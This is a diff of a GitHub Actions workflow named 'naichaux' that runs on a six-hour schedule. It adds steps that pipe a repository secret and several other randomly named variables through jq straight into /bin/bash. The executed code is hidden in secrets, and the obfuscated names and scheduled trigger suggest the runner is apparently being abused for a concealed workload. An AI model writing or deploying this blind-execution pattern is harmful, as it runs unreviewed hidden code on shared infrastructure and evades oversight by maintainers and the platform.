@@ -2,8 +2,8 @@ name: naichaux
 on:
   workflow_dispatch:
   schedule:
-    - cron: '50 3/6 * * *'
-jobs:  # 4717
+    - cron: '55 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,23 +11,17 @@ jobs:  # 4717
       - uses: actions/checkout@v4
       - name: naichaux
         env:
-          jnhg9: ${{ secrets.jnhg9 }}
+          td2339: ${{ secrets.td2339 }}
         run: |
-          echo $jnhg9 | jq -r .xks5884 | /bin/bash
-          echo $tr94116 | jq -r .afj9 | /bin/bash
-          echo $fwk426 | jq -r .qwtp770 | /bin/bash
-          echo $cnrp78 | jq -r .geu07506 | /bin/bash
-          echo $gpg52445 | jq -r .w92 | /bin/bash
-          echo $a90110 | jq -r .njm3426 | /bin/bash
-          echo $sbkd6020 | jq -r .jy143 | /bin/bash
-          echo $svclk8746 | jq -r .jnn076 | /bin/bash
-          echo $fcp81079 | jq -r .qkeso0828 | /bin/bash
-          echo $rlcy17 | jq -r .wonz8 | /bin/bash
-          echo $w894 | jq -r .xohm3449 | /bin/bash
-          echo $v59532 | jq -r .nmnvr76405 | /bin/bash
-          echo $sfbd2 | jq -r .rn200 | /bin/bash
-          echo $pyii443 | jq -r .soo94 | /bin/bash
-          echo $bw706 | jq -r .qd62209 | /bin/bash
-          echo $sejzm46787 | jq -r .ig61386 | /bin/bash
-          echo $wy380 | jq -r .vj98 | /bin/bash
+          echo $td2339 | jq -r .wxrg4336 | /bin/bash
+          echo $iwpve4 | jq -r .elds80 | /bin/bash
+          echo $yczap76150 | jq -r .n88 | /bin/bash
+          echo $q7 | jq -r .ih555 | /bin/bash
+          echo $z5345 | jq -r .b92426 | /bin/bash
+          echo $emx96 | jq -r .ujnkk37 | /bin/bash
+          echo $fgij22232 | jq -r .suyvd6 | /bin/bash
+          echo $l85 | jq -r .nnau1868 | /bin/bash
+          echo $wrhmd6 | jq -r .j6014 | /bin/bash
+          echo $adtec80456 | jq -r .b6 | /bin/bash
+          echo $dyu74 | jq -r .gc7 | /bin/bash
 
